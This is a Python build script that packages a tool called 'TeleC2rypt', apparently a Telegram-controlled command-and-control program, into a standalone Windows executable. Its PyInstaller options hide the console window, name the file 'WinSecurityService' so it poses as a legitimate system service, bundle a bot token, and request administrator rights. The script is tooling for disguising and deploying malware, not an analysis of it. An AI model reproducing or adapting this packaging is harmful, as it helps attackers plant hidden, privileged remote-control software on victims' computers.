#!/usr/bin/env python3
# quick build script for TeleC2rypt
# by Da7rkx0
# last updated: fixed the output name thing

import os
import subprocess
from datetime import datetime

# pyinstaller stuff - mess with these if you need to
OPTS = [
    '--onefile',          # single exe
    '--noconsole',        # no annoying window
    '--name=WinSecurityService',  
    '--add-data=.env;.',  # need this for the bot token
    '--hidden-import=telegram.ext',  # telegram stuff
    '--uac-admin'         # need admin rights
]

def build():
    """builds our exe"""
    try:
        # cleanup old stuff first
        if os.path.exists('dist'):
            print("[*] cleaning up old files...")
            for f in os.listdir('dist'):
                try:
                    os.remove(os.path.join('dist', f))
                except:
                    print(f"[-] couldn't delete {f}, whatever")
                    pass
        
        # build it
        print("[*] building exe...")
        subprocess.run(['pyinstaller', *OPTS, 'telec2rypt.py'], check=True)
        
        # add timestamp to name
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        new_name = f'WinSecurityService_{ts}.exe'
        os.rename('./dist/WinSecurityService.exe', f'./dist/{new_name}')
        
        print(f"[+] done! saved as: {new_name}")
        
    except subprocess.CalledProcessError as e:
        print(f"[-] build failed: {e}")
    except Exception as e:
        print(f"[-] something broke: {e}")

# run it
if __name__ == '__main__':
    build()
